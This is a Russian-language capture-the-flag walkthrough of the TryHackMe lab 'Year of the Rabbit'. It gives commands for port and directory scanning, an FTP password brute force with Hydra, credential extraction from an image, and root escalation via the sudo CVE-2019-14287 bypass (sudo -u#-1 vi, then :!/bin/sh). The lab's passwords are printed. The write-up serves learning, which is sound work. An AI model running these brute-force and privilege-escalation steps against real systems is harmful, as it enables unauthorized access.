# Year of the Rabbit - TryHackMe (Easy)

Машина "Year of the Rabbit" - это пример многоуровневого пентеста, где каждый шаг логично вытекает из предыдущего. Задача - получить два флага: пользовательский (user flag) и root flag.

![01_intro](screens/01_intro.png)

---

## Фаза 1. Разведка

### Шаг 1. Запуск машины и получение IP-адреса

![02_ip](screens/02_ip.png)

После старта целевой машины нам выдаётся IP-адрес - `10.114.159.85`.

---

### Шаг 2. Сканирование портов (Nmap)

![03_nmap](screens/03_nmap.png)


Начинаем с обязательного шага - сканирования открытых портов:

```bash
sudo nmap -sC -sV 10.114.159.85
```

Nmap обнаруживает три открытых порта:

| Порт | Протокол | Версия |
|------|----------|--------|
| 21   | FTP      | vsftpd 3.0.2 |
| 22   | SSH      | OpenSSH 6.7p1 |
| 80   | HTTP     | Apache 2.4.10 (Debian) |

Стандартный набор для Linux-сервера. Заходить будем поочерёдно.

---

## Фаза 2. Веб-разведка

### Шаг 3. Главная страница веб-сервера

![04_web](screens/04_web.png)


Открываем `http://10.114.159.85` - перед нами дефолтная страница Apache2 под Debian. Ничего интересного, но это означает, что нужно искать скрытые директории.

---

### Шаг 4. Перебор директорий (Gobuster)

![05_gobuster](screens/05_gobuster.png)

Запускаем Gobuster с базовым словарём:

```bash
gobuster dir -u http://10.114.159.85 -w /usr/share/dirb/wordlists/common.txt
```

Из результатов выделяется одна запись - **`/assets`** (301 Redirect). Остальные возвращают 403. Идём туда.

---

### Шаг 5. Исследование директории /assets

![06_assets](screens/06_assets.png)


По адресу `http://10.114.159.85/assets/` находим два файла:
- `RickRolled.mp4` - видео весом 384 МБ
- `style.css` - таблица стилей

Скачивать гигантское видео смысла нет. Открываем CSS.

---

### Шаг 6. Секрет в комментарии CSS-файла

![07_style](screens/07_style.png)


В файле `style.css` среди обычных стилей обнаруживается закомментированная строка.

Отличная находка, скрытый PHP-файл. Переходим по адресу.

---

### Шаг 7. JavaScript-защита и рикролл

![08_javascript](screens/08_javascript.png)

![09_youtube](screens/09_youtube.png)


При попытке открыть `/sup3r_s3cr3t_fl4g.php` в браузере появляется JavaScript-алёрт с текстом: *"Turn off your javascript..."*, а затем происходит перенаправление прямо на YouTube. Страница защищена JavaScript-редиректом.

---

### Шаг 8. Обход через curl

![10_intermediary](screens/10_intermediary.png)


Используем `curl`, чтобы получить «сырые» HTTP-заголовки без выполнения JavaScript:

```bash
curl -I http://10.114.159.85/sup3r_s3cr3t_fl4g.php
```

Сервер возвращает **302 Found** с заголовком:

```
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

Скрытая директория - **`/WExYY2Cv-qU`**.

---

### Шаг 9. Скрытая директория и изображение

![11_directory](screens/11_directory.png)

![12_download_image](screens/12_download_image.png)


Переходим по `http://10.114.159.85/WExYY2Cv-qU/` - внутри один файл: `Hot_Babe.png`. Скачиваем его:

```bash
wget http://10.114.159.85/WExYY2Cv-qU/Hot_Babe.png
```

---

## Фаза 3. Стеганография

### Шаг 10. Извлечение данных из изображения (strings)

![13_strings](screens/13_strings.png)


Запускаем утилиту `strings` прямо на скачанный PNG-файл:

```bash
strings Hot_Babe.png
```

![14_ftpuser](screens/14_ftpuser.png)

В потоке текстовых строк из изображения находим спрятанное сообщение с именем пользователя FTP и длинным списком потенциальных паролей:

![15_nano_pass](screens/15_nano_pass.png)

![16_all_passes](screens/16_all_passes.png)

Сохраняем весь список паролей в файл `pass`.

---

## Фаза 4. Брутфорс FTP

### Шаг 11. Подбор пароля через Hydra

![17_ftp_pass](screens/17_ftp_pass.png)

Теперь у нас есть логин (`ftpuser`) и словарь паролей. Запускаем Hydra:

```bash
hydra -l ftpuser -P pass ftp://10.114.159.85
```

Hydra достаточно быстро находит рабочий пароль: **`5iezlwGXkfPKQ`**.

---

### Шаг 12. Подключение к FTP и скачивание файла

![18_success_ftp](screens/18_success_ftp.png)

Подключаемся к FTP-серверу с найденными учётными данными:

```bash
ftp 10.114.159.85
```

![19_download_file](screens/19_download_file.png)

После входа видим файл `Eli's_Creds.txt`. Скачиваем его командой `get`.

---

## Фаза 5. Brainfuck и первый SSH

### Шаг 13. Расшифровка файла Eli's_Creds.txt

![20_cat](screens/20_cat.png)


Открываем скачанный файл и видим нечто странное.

![21_copy_sh](screens/21_copy_sh.png)


Это код на языке **Brainfuck**. Одном из самых экзотических языков запутывания. Вставляем его в онлайн-интерпретатор [copy.sh/brainfuck](https://copy.sh/brainfuck/) и получаем обычный текст - имя пользователя и пароль для SSH.

---

### Шаг 14. Вход по SSH под пользователем eli

![22_ssh](screens/22_ssh.png)

![23_ls](screens/23_ls.png)


```bash
ssh eli@10.114.159.85
```

После ввода пароля - успешный вход. При авторизации сразу выводится интересное сообщение от Root для пользователя Gwendoline:

![24_secret](screens/24_secret.png)

> *"I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"*

Подсказка очевидна, ищем секретную директорию.

---

## Фаза 6. Горизонтальное перемещение

### Шаг 15. Поиск секретного места

![25_usr](screens/25_usr.png)

Ищем всё, что связано с "s3cr3t":

```bash
find / -name "*s3cr3t*" 2>/dev/null
```

![26_pass](screens/26_pass.png)

Находим директорию **`/usr/games/s3cr3t`**. Переходим туда и читаем скрытый файл внутри.

Root сам слил пароль - **`MniVCQVhQHUNI`**.

---

### Шаг 16. SSH под пользователем gwendoline

![27_gwedoline_ssh](screens/27_gwedoline_ssh.png)

```bash
ssh gwendoline@10.114.159.85
```

Вход успешен.

---

### Шаг 17. Получение User Flag

![28_thm_flag_user](screens/28_thm_flag_user.png)

В домашней директории пользователя `gwendoline` лежит `user.txt`:

```bash
cat user.txt
```

Получаем user флаг.

---

## Фаза 7. Эскалация привилегий

### Шаг 18. Анализ sudo-прав

![29_sudo-l](screens/29_sudo-l.png)

Смотрим, что может запускать gwendoline от имени других пользователей:

```bash
sudo -l
```

Результат:

```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Разрешение интересное: можно запускать `vi` от имени **любого пользователя, кроме root**. Но это обходится через уязвимость CVE-2019-14287 в sudo, когда версия sudo ниже 1.8.28, можно использовать UID `-1` (или `4294967295`), который sudo интерпретирует как root.

---

### Шаг 19. Эксплуатация sudo + vi для получения root

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

![30_sh](screens/30_sh.png)


Внутри редактора vi выполняем команду для запуска shell:

``` :!/bin/sh ``` или ``` :!sh ```

Получаем оболочку с правами **root**.

---

### Шаг 20. Получение Root Flag

![31_flag](screens/31_flag.png)


```bash
cat /root/root.txt
```
---

![32_answer](screens/32_answer.png)


## Итог

Машина прошла по следующей цепочке:

1. **Nmap** - обнаружение портов 21, 22, 80
2. **Gobuster** → `/assets` → `style.css` → скрытый PHP-файл
3. **curl** - обход JavaScript-редиректа, нахождение скрытой директории
4. **strings** на PNG - извлечение имени пользователя FTP и списка паролей
5. **Hydra** - брутфорс FTP, получение пароля
6. **FTP** - скачивание `Eli's_Creds.txt` с Brainfuck-кодом
7. **Brainfuck-декодер** - получение SSH-креденциалов для `eli`
8. **find** - обнаружение `/usr/games/s3cr3t` с паролем для `gwendoline`
9. **User flag** получен из домашней директории
10. **CVE-2019-14287** (sudo + vi) - эскалация до root
11. **Root flag** получен из `/root/root.txt`
